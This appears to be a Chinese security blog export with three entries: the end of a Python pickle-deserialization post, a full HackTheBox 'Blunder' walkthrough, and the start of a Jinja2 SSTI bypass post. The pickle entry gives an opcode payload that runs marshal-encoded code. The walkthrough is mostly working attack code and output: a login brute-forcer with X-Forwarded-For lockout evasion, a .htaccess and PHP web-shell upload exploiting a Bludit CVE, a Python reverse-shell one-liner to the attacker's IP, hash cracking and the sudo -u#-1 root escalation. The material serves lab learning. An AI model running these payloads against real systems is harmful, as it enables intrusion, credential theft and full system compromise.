<p>好，现在我们需要让这段代码在反序列化的时候得到执行，那我们还能不能直接使用 <code>__reduce__</code> 呢？好像不行，因为 reduce 是利用调用某个 callable 并传递参数来执行的，而我们这个函数本身就是一个 callable ，我们需要执行它，而不是将他作为某个函数的参数，这个时候就需要自己构造opcode。</p>
<p>这里也用到了 Python 的一个面向对象的特性，Python 能通过 types.FunctionTyle(func_code,globals(),’’)() 来动态地创建匿名函数：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle,builtins,pickletools,base64</span><br><span class="line"><span class="keyword">import</span> marshal</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">foo</span>():</span></span><br><span class="line">    <span class="keyword">import</span> os</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">fib</span>(<span class="params">n</span>):</span></span><br><span class="line">        <span class="keyword">if</span> n &lt;= <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">return</span> n</span><br><span class="line">        <span class="keyword">return</span> fib(n<span class="number">-1</span>) + fib(n<span class="number">-2</span>)</span><br><span class="line">    <span class="keyword">print</span> (fib(<span class="number">5</span>))</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    pickle.dumps(foo.__code__)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    print(e)</span><br><span class="line">code_serialized = base64.b64encode(marshal.dumps(foo.__code__))</span><br><span class="line">code_unserialized = marshal.loads(base64.b64decode(code_serialized))</span><br><span class="line">code_unserialized = types.FunctionType(code_unserialized, globals(), <span class="string">&#x27;&#x27;</span>)()</span><br><span class="line">print(code_unserialized)</span><br></pre></td></tr></table></figure>
<p>那我们现在的任务就是如何通过 PVM 操作码来构造出这个东西的执行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ctypes</span><br><span class="line">FunctionType</span><br><span class="line">(cmarshal</span><br><span class="line">loads</span><br><span class="line">(cbase64</span><br><span class="line">b64decode</span><br><span class="line">(S&#39;YwAAA...&#39;           #code对象序列化编码</span><br><span class="line">tRtRc__builtin__</span><br><span class="line">globals</span><br><span class="line">(tRS&#39;&#39;</span><br><span class="line">tR(tR.</span><br></pre></td></tr></table></figure>
<p>利用方式</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">foo</span>():</span></span><br><span class="line">    <span class="keyword">import</span> os</span><br><span class="line">    <span class="keyword">return</span> os.system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line">code_serialized = base64.b64encode(marshal.dumps(foo()))</span><br><span class="line">print(code_serialized)</span><br></pre></td></tr></table></figure>
<p>执行结果：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210103211313.png" alt=""></p>
<p>在pickle下尝试执行：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&quot;&quot;&quot;ctypes</span></span><br><span class="line"><span class="string">FunctionType</span></span><br><span class="line"><span class="string">(cmarshal</span></span><br><span class="line"><span class="string">loads</span></span><br><span class="line"><span class="string">(cbase64</span></span><br><span class="line"><span class="string">b64decode</span></span><br><span class="line"><span class="string">(S&#x27;6QAAAAA=&#x27;   #whomai</span></span><br><span class="line"><span class="string">tRtRc__builtin__</span></span><br><span class="line"><span class="string">globals</span></span><br><span class="line"><span class="string">(tRS&#x27;&#x27;</span></span><br><span class="line"><span class="string">tR(tR.&quot;&quot;&quot;</span></span><br><span class="line">data = pickle.loads(payload)</span><br><span class="line">print(data)</span><br></pre></td></tr></table></figure>
<p>于是又有一个黑名单绕过执行函数的方式。</p>
<h2 id="0x04-Others">0x04 Others</h2>
<p>当然还有一些其他的反序列化方式，例如PyYaml，Jsonpickle，Shelve，这里就不多赘述了。</p>
<p><a href="https://misakikata.github.io/2020/04/python-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">https://misakikata.github.io/2020/04/python-反序列化/</a></p>
]]></content>
      <categories>
        <category>Web基础安全学习</category>
      </categories>
      <tags>
        <tag>Web安全学习</tag>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB::Blunder-walkthrough</title>
    <url>/Target_drone/HackTheBox/20.HackTheBox-Blunder-walkthrough/</url>
    <content><![CDATA[<h1 id="HTB-Blunder-Walkthrough">HTB::Blunder Walkthrough</h1>
<h2 id="0x01-Info-Card">0x01 Info Card</h2>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200601172155.png" style="zoom:80%;" />
<h2 id="0x02-Tools-and-tips">0x02 Tools and tips</h2>
<ul>
<li>nmap</li>
<li>dirsearch</li>
<li>wfuzz</li>
<li>cewl</li>
<li>CMS password leakage</li>
<li>sudo -u#-1</li>
</ul>
<h2 id="0x03-Pentesting">0x03 Pentesting</h2>
<h3 id="Initial-Enumeration">Initial Enumeration</h3>
<p>nmap扫描端口：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Nmap 7.80 scan initiated Sun May 31 19:18:12 2020 as: nmap -sC -sV -Pn -oN nmap.txt blunder.htb</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> blunder.htb (10.10.10.191)</span><br><span class="line">Host is up (0.28s latency).</span><br><span class="line">Not shown: 998 filtered ports</span><br><span class="line">PORT   STATE  SERVICE VERSION</span><br><span class="line">21/tcp closed ftp</span><br><span class="line">80/tcp open   http    Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">|_http-generator: Blunder</span><br><span class="line">|_http-server-header: Apache/2.4.41 (Ubuntu)</span><br><span class="line">|_http-title: Blunder | A blunder of interesting facts</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line"><span class="comment"># Nmap done at Sun May 31 19:18:52 2020 -- 1 IP address (1 host up) scanned in 40.22 seconds</span></span><br></pre></td></tr></table></figure>
<p>dirsearch扫描路径：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo dirsearch -u http://blunder.htb -e *</span><br><span class="line">Extensions: 46060.txt | HTTP method: get | Threads: 10 | Wordlist size: 6124</span><br><span class="line">Target: http://blunder.htb</span><br><span class="line"></span><br><span class="line">[17:25:56] Starting: </span><br><span class="line">[17:25:59] 200 -    7KB - /%3f/</span><br><span class="line">[17:26:07] 200 -  563B  - /.gitignore</span><br><span class="line">[17:26:24] 200 -    7KB - /0                         </span><br><span class="line">[17:26:41] 200 -    3KB - /about                     </span><br><span class="line">[17:26:49] 301 -    0B  - /admin  -&gt;  http://10.10.10.191/admin/</span><br><span class="line">[17:26:53] 200 -    2KB - /admin/.config</span><br><span class="line">[17:26:53] 200 -    2KB - /admin/</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">[17:29:40] 200 -    2KB - /admin/web/</span><br><span class="line">[17:29:40] 200 -    2KB - /admin/login.htm</span><br><span class="line">[17:31:22] 301 -    0B  - /domcfg.nsf/?open  -&gt;  http://10.10.10.191/domcfg.nsf</span><br><span class="line">[17:32:02] 200 -   30B  - /install.php</span><br><span class="line">[17:32:14] 200 -    1KB - /LICENSE</span><br><span class="line">[17:33:29] 200 -    3KB - /README.md</span><br><span class="line">[17:33:33] 200 -   22B  - /robots.txt</span><br></pre></td></tr></table></figure>
<p><code>admin</code>需要登录名和密码，<code>.gitignore</code>和<code>robots.txt</code>没有可利用的信息，现在应该是要寻找后台的登陆凭证。</p>
<p>wfuzz扫描web目录下有没有什么敏感文件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/common.txt --hc 404,403 -u <span class="string">&quot;http://blunder.htb/FUZZ.txt&quot;</span> -t 100</span><br><span class="line">********************************************************</span><br><span class="line">* Wfuzz 2.4.5 - The Web Fuzzer                         *</span><br><span class="line">********************************************************</span><br><span class="line"></span><br><span class="line">Target: http://blunder.htb/FUZZ.txt</span><br><span class="line">Total requests: 4652</span><br><span class="line"></span><br><span class="line">===================================================================</span><br><span class="line">ID           Response   Lines    Word     Chars       Payload</span><br><span class="line">===================================================================</span><br><span class="line"></span><br><span class="line">000003513:   200        1 L      4 W      22 Ch       <span class="string">&quot;robots&quot;</span></span><br><span class="line">000004119:   200        4 L      23 W     118 Ch      <span class="string">&quot;todo&quot;</span></span><br><span class="line"></span><br><span class="line">Total time: 44.66474</span><br><span class="line">Processed Requests: 4652</span><br><span class="line">Filtered Requests: 4650</span><br><span class="line">Requests/sec.: 104.1537</span><br></pre></td></tr></table></figure>
<p><code>todo.txt</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-Update the CMS</span><br><span class="line">-Turn off FTP - DONE</span><br><span class="line">-Remove old users - DONE</span><br><span class="line">-Inform fergus that the new blog needs images - PENDING</span><br></pre></td></tr></table></figure>
<p>盲猜一手<code>fergus</code>应该登录名<code>username</code>，再去寻找password。找了大半天没什么进展，按照HTB的尿性，应该要用主页上的信息生成自定义的字典。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ cewl -w wordlists.txt -d 10 -m 1 http://blunder.htb/</span><br><span class="line"></span><br><span class="line">$ wc wordlist.txt </span><br><span class="line"> 354  354 2459 wordlist.txt</span><br></pre></td></tr></table></figure>
<p>用burp和wfuzz工具都没能Brute Force出来，只能写Python脚本爆破了：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">open_resources</span>(<span class="params">file_path</span>):</span></span><br><span class="line">    <span class="keyword">return</span> [item.replace(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;&quot;</span>) <span class="keyword">for</span> item <span class="keyword">in</span> open(file_path).readlines()]</span><br><span class="line"></span><br><span class="line">host = <span class="string">&#x27;http://10.10.10.191&#x27;</span></span><br><span class="line">login_url = host + <span class="string">&#x27;/admin/login&#x27;</span></span><br><span class="line">username = <span class="string">&#x27;fergus&#x27;</span></span><br><span class="line">wordlist = open_resources(<span class="string">&#x27;/home/Hackthebox/Blunder/wordlist.txt&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> password <span class="keyword">in</span> wordlist:</span><br><span class="line">    session = requests.Session()</span><br><span class="line">    login_page = session.get(login_url)</span><br><span class="line">    csrf_token = re.search(<span class="string">&#x27;input.+?name=&quot;tokenCSRF&quot;.+?value=&quot;(.+?)&quot;&#x27;</span>, login_page.text).group(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    print(<span class="string">&#x27;[*] Trying: &#123;p&#125;&#x27;</span>.format(p = password))</span><br><span class="line"></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;X-Forwarded-For&#x27;</span>: password,</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Referer&#x27;</span>: login_url</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;tokenCSRF&#x27;</span>: csrf_token,</span><br><span class="line">        <span class="string">&#x27;username&#x27;</span>: username,</span><br><span class="line">        <span class="string">&#x27;password&#x27;</span>: password,</span><br><span class="line">        <span class="string">&#x27;save&#x27;</span>: <span class="string">&#x27;&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    login_result = session.post(login_url, headers = headers, data = data, allow_redirects = <span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;location&#x27;</span> <span class="keyword">in</span> login_result.headers:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;/admin/dashboard&#x27;</span> <span class="keyword">in</span> login_result.headers[<span class="string">&#x27;location&#x27;</span>]:</span><br><span class="line">            print()</span><br><span class="line">            print(<span class="string">&#x27;SUCCESS: Password found!&#x27;</span>)</span><br><span class="line">            print(<span class="string">&#x27;Use &#123;u&#125;:&#123;p&#125; to login.&#x27;</span>.format(u = username, p = password))</span><br><span class="line">            print()</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p>跑出来的结果：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[*] Trying: character</span><br><span class="line">[*] Trying: RolandDeschain</span><br><span class="line">()</span><br><span class="line">SUCCESS: Password found!</span><br><span class="line">Use fergus:RolandDeschain to login.</span><br></pre></td></tr></table></figure>
<p>用<code>fergus:RolandDeschain </code>登录后台管理系统：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200601185345.png" alt=""></p>
<p>发现这个使用开源的<code>Bludit CMS</code>搭建的，Google一下看有没有公开的CVE：</p>
<blockquote>
<p><a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16113">http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16113</a></p>
</blockquote>
<p>顺着References中的Github链接还找到作者发现CVE的过程，而且还是中国人，@christa。(这次终于不用看英文的利用过程了😄）</p>
<blockquote>
<p><a href="https://christa.top/details/46/">https://christa.top/details/46/</a></p>
</blockquote>
<p>首先上传<code>.htaccess</code>文件，用burp改包绕过前端的后缀名验证：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;admin&#x2F;ajax&#x2F;upload-images HTTP&#x2F;1.1</span><br><span class="line">Host: blunder.htb</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (X11; Linux x86_64; rv:68.0) Gecko&#x2F;20100101 Firefox&#x2F;68.0</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en-US,en;q&#x3D;0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http:&#x2F;&#x2F;blunder.htb&#x2F;admin&#x2F;new-content</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;---------------------------5424398841862763197378512212</span><br><span class="line">Content-Length: 531</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: BLUDITREMEMBERUSERNAME&#x3D;fergus; BLUDITREMEMBERTOKEN&#x3D;d08d8cfe8c70b89c242b0a33531998d7; BLUDIT-KEY&#x3D;dpodie00jad4a6akmo5hookqd2</span><br><span class="line"></span><br><span class="line">-----------------------------5424398841862763197378512212</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;images[]&quot;; filename&#x3D;&quot;.htaccess&quot;</span><br><span class="line">Content-Type: image&#x2F;jpeg</span><br><span class="line"></span><br><span class="line">RewriteEngine Off</span><br><span class="line">-----------------------------5424398841862763197378512212</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;uuid&quot;</span><br><span class="line"></span><br><span class="line">0fad6e18e5d590f2af2b005ac4f7f80f</span><br><span class="line">-----------------------------5424398841862763197378512212</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;tokenCSRF&quot;</span><br><span class="line"></span><br><span class="line">7ca474f9c654ff0e46761ac0e435423a5a8c012a</span><br><span class="line">-----------------------------5424398841862763197378512212--</span><br></pre></td></tr></table></figure>
<p>再上传shell文件：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;admin&#x2F;ajax&#x2F;upload-images HTTP&#x2F;1.1</span><br><span class="line">Host: blunder.htb</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (X11; Linux x86_64; rv:68.0) Gecko&#x2F;20100101 Firefox&#x2F;68.0</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en-US,en;q&#x3D;0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http:&#x2F;&#x2F;blunder.htb&#x2F;admin&#x2F;new-content</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;---------------------------5424398841862763197378512212</span><br><span class="line">Content-Length: 540</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: BLUDITREMEMBERUSERNAME&#x3D;fergus; BLUDITREMEMBERTOKEN&#x3D;d08d8cfe8c70b89c242b0a33531998d7; BLUDIT-KEY&#x3D;dpodie00jad4a6akmo5hookqd2</span><br><span class="line"></span><br><span class="line">-----------------------------5424398841862763197378512212</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;images[]&quot;; filename&#x3D;&quot;shell.php&quot;</span><br><span class="line">Content-Type: image&#x2F;jpeg</span><br><span class="line"></span><br><span class="line">GIF89a</span><br><span class="line">&lt;?php system($_GET[&#39;cmd&#39;]); ?&gt;</span><br><span class="line">-----------------------------5424398841862763197378512212</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;uuid&quot;</span><br><span class="line"></span><br><span class="line">0fad6e18e5d590f2af2b005ac4f7f80f</span><br><span class="line">-----------------------------5424398841862763197378512212</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;tokenCSRF&quot;</span><br><span class="line"></span><br><span class="line">7ca474f9c654ff0e46761ac0e435423a5a8c012a</span><br><span class="line">-----------------------------5424398841862763197378512212--</span><br></pre></td></tr></table></figure>
<p>本地监听端口，浏览器访问shell文件，<code>cmd</code>参数如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;blunder.htb&#x2F;bl-content&#x2F;tmp&#x2F;shell.php?cmd&#x3D;python -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.14.4&quot;,9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;sh&quot;,&quot;-i&quot;]);&#39;</span><br></pre></td></tr></table></figure>
<p>本机得到reverse shell：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># kali @ kali in ~&#x2F;HackTheBox&#x2F;Blunder [17:25:45] </span><br><span class="line">$ nc -lvnp 9999</span><br><span class="line">listening on [any] 9999 ...</span><br><span class="line">connect to [10.10.14.4] from (UNKNOWN) [10.10.10.191] 59878</span><br><span class="line">&#x2F;bin&#x2F;sh: 0: can&#39;t access tty; job control turned off</span><br><span class="line">$ python -c &quot;import pty;pty.spawn(&#39;&#x2F;bin&#x2F;bash&#39;)&quot;</span><br><span class="line">www-data@blunder:&#x2F;var&#x2F;www&#x2F;bludit-3.9.2&#x2F;bl-content&#x2F;tmp$ id</span><br><span class="line">id</span><br><span class="line">uid&#x3D;33(www-data) gid&#x3D;33(www-data) groups&#x3D;33(www-data)</span><br></pre></td></tr></table></figure>
<h3 id="Getting-User-Access">Getting User Access</h3>
<p>接下来的工作就是要找提权的用户名和密码了，这种简单难度的靶机一般会在某些文件中泄露这些信息~</p>
<p>经过一番查找，发现在<code>/var/www</code>目录下还有另外一个新版本的<code>Bludit CMS</code>，其中有一个文件是在<code>/var/www/bludit-3.10.0a/bl-content/databases</code>下面，文件名是<code>users.php</code>：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> defined(<span class="string">&#x27;BLUDIT&#x27;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;Bludit CMS.&#x27;</span>); <span class="meta">?&gt;</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;admin&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;nickname&quot;</span>: <span class="string">&quot;Hugo&quot;</span>,</span><br><span class="line">        <span class="string">&quot;firstName&quot;</span>: <span class="string">&quot;Hugo&quot;</span>,</span><br><span class="line">        <span class="string">&quot;lastName&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;role&quot;</span>: <span class="string">&quot;User&quot;</span>,</span><br><span class="line">        <span class="string">&quot;password&quot;</span>: <span class="string">&quot;faca404fd5c0a31cf1897b823c695c85cffeb98d&quot;</span>,</span><br><span class="line">        <span class="string">&quot;email&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;registered&quot;</span>: <span class="string">&quot;2019-11-27 07:40:55&quot;</span>,</span><br><span class="line">        <span class="string">&quot;tokenRemember&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;tokenAuth&quot;</span>: <span class="string">&quot;b380cb62057e9da47afce66b4615107d&quot;</span>,</span><br><span class="line">        <span class="string">&quot;tokenAuthTTL&quot;</span>: <span class="string">&quot;2009-03-15 14:00&quot;</span>,</span><br><span class="line">        <span class="string">&quot;twitter&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;facebook&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;instagram&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;codepen&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;linkedin&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;github&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;gitlab&quot;</span>: <span class="string">&quot;&quot;</span>&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>很明显有一个<code>password</code>，看样子应该是经过了一次hash，用<code>hash-identifier</code>查看加密方式：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Possible Hashs:</span><br><span class="line">[+] SHA-1</span><br><span class="line">[+] MySQL5 - SHA-1(SHA-1(<span class="variable">$pass</span>))</span><br><span class="line"></span><br><span class="line">Least Possible Hashs:</span><br><span class="line">[+] Tiger-160</span><br><span class="line">[+] Haval-160</span><br><span class="line">[+] RipeMD-160</span><br><span class="line">[+] SHA-1(HMAC)</span><br><span class="line">[+] Tiger-160(HMAC)</span><br><span class="line">[+] RipeMD-160(HMAC)</span><br><span class="line">[+] Haval-160(HMAC)</span><br><span class="line">[+] SHA-1(MaNGOS)</span><br><span class="line">[+] SHA-1(MaNGOS2)</span><br><span class="line">[+] sha1(<span class="variable">$pass</span>.<span class="variable">$salt</span>)</span><br><span class="line">[+] sha1(<span class="variable">$salt</span>.<span class="variable">$pass</span>)</span><br><span class="line">[+] sha1(<span class="variable">$salt</span>.md5(<span class="variable">$pass</span>))</span><br><span class="line">[+] sha1(<span class="variable">$salt</span>.md5(<span class="variable">$pass</span>).<span class="variable">$salt</span>)</span><br><span class="line">[+] sha1(<span class="variable">$salt</span>.sha1(<span class="variable">$pass</span>))</span><br><span class="line">[+] sha1(<span class="variable">$salt</span>.sha1(<span class="variable">$salt</span>.sha1(<span class="variable">$pass</span>)))</span><br><span class="line">[+] sha1(<span class="variable">$username</span>.<span class="variable">$pass</span>)</span><br><span class="line">[+] sha1(<span class="variable">$username</span>.<span class="variable">$pass</span>.<span class="variable">$salt</span>)</span><br><span class="line">[+] sha1(md5(<span class="variable">$pass</span>))</span><br><span class="line">[+] sha1(md5(<span class="variable">$pass</span>).<span class="variable">$salt</span>)</span><br><span class="line">[+] sha1(md5(sha1(<span class="variable">$pass</span>)))</span><br><span class="line">[+] sha1(sha1(<span class="variable">$pass</span>))</span><br><span class="line">[+] sha1(sha1(<span class="variable">$pass</span>).<span class="variable">$salt</span>)</span><br><span class="line">[+] sha1(sha1(<span class="variable">$pass</span>).substr(<span class="variable">$pass</span>,0,3))</span><br><span class="line">[+] sha1(sha1(<span class="variable">$salt</span>.<span class="variable">$pass</span>))</span><br><span class="line">[+] sha1(sha1(sha1(<span class="variable">$pass</span>)))</span><br><span class="line">[+] sha1(strtolower(<span class="variable">$username</span>).<span class="variable">$pass</span>)</span><br><span class="line">--------------------------------------------------</span><br></pre></td></tr></table></figure>
<p>在线加密工具：<a href="https://md5decrypt.net/en/Sha1">https://md5decrypt.net/en/Sha1</a></p>
<p>输入<code>faca404fd5c0a31cf1897b823c695c85cffeb98d</code>得到明文<code>Password120</code>。</p>
<p>su切换用户：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ su hugo</span><br><span class="line">su hugo</span><br><span class="line">Password: Password120 </span><br><span class="line"></span><br><span class="line">hugo@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ id</span><br><span class="line">id</span><br><span class="line">uid=1001(hugo) gid=1001(hugo) groups=1001(hugo)</span><br><span class="line">hugo@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ <span class="built_in">cd</span> </span><br><span class="line">catcd</span><br><span class="line">hugo@blunder:~$  user.txt</span><br><span class="line">cat user.txt</span><br><span class="line">947a-----------------------a7bb</span><br></pre></td></tr></table></figure>
<h3 id="Getting-Root-Access">Getting Root Access</h3>
<p>按照套路：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hugo@blunder:~$ sudo -l</span><br><span class="line">sudo -l</span><br><span class="line">Password: Password120</span><br><span class="line"></span><br><span class="line">Matching Defaults entries for hugo on blunder:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin\:&#x2F;usr&#x2F;local&#x2F;bin\:&#x2F;usr&#x2F;sbin\:&#x2F;usr&#x2F;bin\:&#x2F;sbin\:&#x2F;bin\:&#x2F;snap&#x2F;bin</span><br><span class="line"></span><br><span class="line">User hugo may run the following commands on blunder:</span><br><span class="line">    (ALL, !root) &#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>
<p>Google <code>(ALL, !root) /bin/bash</code>，有下面这种提权方式：</p>
<blockquote>
<p><a href="https://www.exploit-db.com/exploits/47502">https://www.exploit-db.com/exploits/47502</a></p>
</blockquote>
<p>很简单，一个命令解决：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hugo@blunder:~$ sudo -u#-1 &#x2F;bin&#x2F;bash</span><br><span class="line">sudo -u#-1 &#x2F;bin&#x2F;bash</span><br><span class="line">root@blunder:&#x2F;home&#x2F;hugo# id</span><br><span class="line">id</span><br><span class="line">uid&#x3D;0(root) gid&#x3D;1001(hugo) groups&#x3D;1001(hugo)</span><br><span class="line">root@blunder:&#x2F;home&#x2F;hugo# cd</span><br><span class="line">cd</span><br><span class="line">root@blunder:&#x2F;# cat &#x2F;root&#x2F;root.txt</span><br><span class="line">cat &#x2F;root&#x2F;root.txt</span><br><span class="line">b4c0------------------------d45f</span><br></pre></td></tr></table></figure>
<p>这个靶机除了找密码的过程，其他还是算蛮简单的~~</p>
<h2 id="0x04-Reference">0x04 Reference</h2>
<table>
<thead>
<tr>
<th>Topic</th>
<th>Url</th>
</tr>
</thead>
<tbody>
<tr>
<td>Bludit CVE</td>
<td><a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16113">http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16113</a></td>
</tr>
<tr>
<td>Bludit CVE</td>
<td><a href="https://christa.top/details/46/">https://christa.top/details/46/</a></td>
</tr>
<tr>
<td>Sha1 decryption</td>
<td><a href="https://md5decrypt.net/en/Sha1">https://md5decrypt.net/en/Sha1</a></td>
</tr>
<tr>
<td>sudo priv</td>
<td><a href="https://www.exploit-db.com/exploits/47502">https://www.exploit-db.com/exploits/47502</a></td>
</tr>
</tbody>
</table>
]]></content>
      <categories>
        <category>靶机</category>
      </categories>
      <tags>
        <tag>靶机</tag>
        <tag>HTB</tag>
      </tags>
  </entry>
  <entry>
    <title>jinja_SSTI_Bypass</title>
    <url>/Python/pysec/1.Jinja2%E7%9A%84SSTI+Bypass/</url>
    <content><![CDATA[<h1 id="jinja2-SSTI-Bypass">jinja2 SSTI &amp; Bypass</h1>
<p>本文主要针对jinja2的SSTI做一些讲解和说明。</p>
<h2 id="常用的内建属性">常用的内建属性</h2>
<h3 id="class"><code>__class__</code></h3>
<p>用于返回对象所属的类，和<code>type()</code>相同：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">str</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; ().<span class="title">__class__</span></span></span><br><span class="line"><span class="class">&lt;<span class="title">class</span> &#x27;<span class="title">tuple</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; [].<span class="title">__class__</span></span></span><br><span class="line"><span class="class">&lt;<span class="title">class</span> &#x27;<span class="title">list</span>&#x27;&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="base"><code>__base__</code></h3>
<p>以字符串的形式返回一个类所继承的类，一般情况下是object</p>
<h3 id="bases"><code>__bases__</code></h3>
<p>以元组的形式返回一个类所继承的类</p>
<h3 id="mro"><code>__mro__</code></h3>
<p>返回解析方法调用的顺序，按照子类到父类到父父类的顺序返回所有类</p>
